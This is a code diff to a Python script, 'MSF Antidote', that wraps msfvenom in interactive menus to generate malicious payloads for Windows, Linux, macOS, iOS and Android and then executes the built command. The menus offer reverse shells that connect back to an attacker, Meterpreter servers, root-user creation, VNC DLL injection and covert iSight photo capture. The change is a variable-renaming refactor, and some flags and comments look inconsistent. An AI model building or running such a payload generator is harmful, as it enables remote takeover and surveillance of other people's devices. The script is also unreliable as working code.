@@ -30,8 +30,8 @@ white_b = '\u001b[47m'
 def main():
 
     #Command Variables
-    platform = ''
-    architecture =''
+    plat_str = ''
+    arch_str =''
     ip = ''
     port = ''
     stage = ''
@@ -40,8 +40,8 @@ def main():
     form= ''
     payload = ''
     output = ''
-    plat = ''
-    arch = ''
+    plat_cmd = ''
+    arch_cmd = ''
 
     #OS Detection
     detect_input = input('\nWelcome to MSF Antidote.  Would you like to enable OS detection? [Requires Nmap] (y/n)  ')
@@ -62,15 +62,15 @@ def main():
 
     ### WINDOWS-----------------------------------------------------------------------------------------------------------------------------------------------------
         if platform_input == '1':
-            platform = 'msfvenom -p windows/' 
-            form = '-f exe'
-            plat = '--platform windows'
+            plat_str = 'msfvenom -p windows/' 
+            plat_cmd = '--platform windows'
+            form = '-f exe'            
             
         #Windows Architecture Input
             architecture_input = input('\nSelect Platform Architecture:\n\n1) x86\n\n2) x64')
             os.system('clear')
             if architecture_input == '1':
-                arch = '-a x86'
+                arch_cmd = '-a x86'
 
         #Windows x86 Payload Input
                 payload_input = input('Select from available payloads:\n\n1) Spawn a piped command shell\n\n2) Upload an executable and run it\n\n3) Inject a VNC Dll via a reflective loader\n\n')
@@ -85,8 +85,8 @@ def main():
 
         #Windows x64 Payload Input
             elif architecture_input == '2':
-                architecture = 'x64/'
-                arch = 'x64'
+                arch_str = 'x64/'
+                arch_cmd = 'x64'
 
         #Windows x64 Payload Input
                 payload_input = input('Select from available payloads:\n\n1) Listen for a connection and spawn a command shell\n\n2) Connect back to attacker and spawn a command shell\n\n3) Inject a VNC Dll via a reflective loader\n\n')
@@ -103,16 +103,16 @@ def main():
 
     ### LINUX-------------------------------------------------------------------------------------------------------------------------------------------------------
         if platform_input == '2':
-            platform = 'msfvenom -p linux/' 
-            form = '-f elf'
-            plat = '--platform linux'                 
+            plat_str = 'msfvenom -p linux/' 
+            plat_cmd = '--platform linux'  
+            form = '-f elf'                           
     
         #Linux Architecture Input
             architecture_input = input('\nSelect Platform Architecture:\n\n1) x86\n\n2) x64')
             os.system('clear')
             if architecture_input == '1':
-                architecture = 'x86/'
-                arch = '-a x86'
+                arch_str = 'x86/'
+                arch_cmd = '-a x86'
 
         #Linux x86 Payload Input
                 payload_input = input('Select from available payloads:\n\n1) Create a new user with UID 0\n\n2) Execute an arbitrary command or just a /bin/sh shell\n\n3) Connect back to attacker and spawn a command shell\n\n')
@@ -127,8 +127,8 @@ def main():
 
         #Linux x64 Payload Input
             elif architecture_input == '2':
-                architecture = 'x64/'
-                arch = '-a x64'
+                arch_str = 'x64/'
+                arch_cmd = '-a x64'
 
         #Linux x64 Payload Input
                 payload_input = input('Select from available payloads:\n\n1) Execute an arbitrary command or just a /bin/sh shell\n\n2) Accept a connection from attacker and report UUID\n\n3) Connect back to attacker and spawn a command shell\n\n')
@@ -145,16 +145,16 @@ def main():
 
     ### OSX-----------------------------------------------------------------------------------------------------------------------------------------------------------
         if platform_input == '3':
-            platform = 'msfvenom -p osx/' 
-            form = '-f macho'
-            plat = '--platform osx'
+            plat_str = 'msfvenom -p osx/' 
+            plat_cmd = '--platform osx'
+            form = '-f macho'            
             
         #OSX Architecture Input
             architecture_input = input('\nSelect Platform Architecture:\n\n1) x86\n\n2) x64')
             os.system('clear')
             if architecture_input == '1':
-                architecture = 'x86/'
-                arch = '-a x86'
+                arch_str = 'x86/'
+                arch_cmd = '-a x86'
 
         #OSX x86 Payload Input
                 payload_input = input('Select from available payloads:\n\n1) Execute an arbitrary command\n\n2) Connect back to attacker and spawn a command shell\n\n3) Inject a Mach-O bundle to capture a photo from the iSight\n\n')
@@ -169,8 +169,8 @@ def main():
 
         #OSX x64 Payload Input
             elif architecture_input == '2':
-                architecture = 'x64/'
-                arch = '-a x64'
+                arch_str = 'x64/'
+                arch_cmd = '-a x64'
 
         #OSX x64 Payload Input
                 payload_input = input('Select from available payloads:\n\n1) Execute an arbitrary command\n\n2) Say an arbitrary string outloud using Mac OS X text2speech\n\n3) Connect back to attacker and spawn a command shell\n\n')
@@ -187,15 +187,16 @@ def main():
 
     ### Apple ios-----------------------------------------------------------------------------------------------------------------------------------------------------------
         if platform_input == '4':
-            platform = 'msfvenom -p apple_ios/' 
-            plat = '--platform apple_ios'
+            plat_str = 'msfvenom -p apple_ios/' 
+            plat_cmd = '--platform apple_ios'
+            form = '-f macho'
             
         #Apple ios Architecture Input
             architecture_input = input('\nSelect Platform Architecture:\n\n1) aarch64\n\n2) armle')
             os.system('clear')
             if architecture_input == '1':
-                architecture = 'aarch64/'
-                arch = '-a aarch64'
+                arch_str = 'aarch64/'
+                arch_cmd = '-a aarch64'
 
         #Apple ios x86 Payload Input
                 payload_input = input('Select from available payloads:\n\n1) Run the Meterpreter / Mettle server payload\n\n2) Connect back to attacker and spawn a command shell\n\n')
@@ -208,8 +209,8 @@ def main():
 
         #Apple ios x64 Payload Input
             elif architecture_input == '2':
-                architecture = 'armle/'
-                arch = '-a armle'
+                arch_str = 'armle/'
+                arch_cmd = '-a armle'
 
         #Apple ios x64 Payload Input
                 payload_input = input('Select from available payloads:\n\n1) Run the Meterpreter / Mettle server payload\n\n')
@@ -222,8 +223,9 @@ def main():
 
     ### ANDROID-----------------------------------------------------------------------------------------------------------------------------------------------------------
         if platform_input == '5':
-            platform = 'msfvenom -p android/'   
-            plat = '--platform android'
+            plat_str = 'msfvenom -p android/'   
+            plat_cmd = '--platform android'
+            arch_cmd = '-a dalvik'
         
         #Android Payload Input
             payload_input = input('Select from available payloads:\n\n1) Run a meterpreter server in Android. Connect back stager\n\n2) Spawn a piped command shell (sh). Connect back stager\n\n')
@@ -254,7 +256,7 @@ def main():
     os.system('clear')
 
     #Final Command       
-    cmd = f'{platform}{architecture}{payload} {plat} {arch} {LHOST} {LPORT} {form} {output}'
+    cmd = f'{plat_str}{arch_str}{payload} {plat_cmd} {arch_cmd} {LHOST} {LPORT} {form} {output}'
 
     os.system(cmd)
     print(cmd)
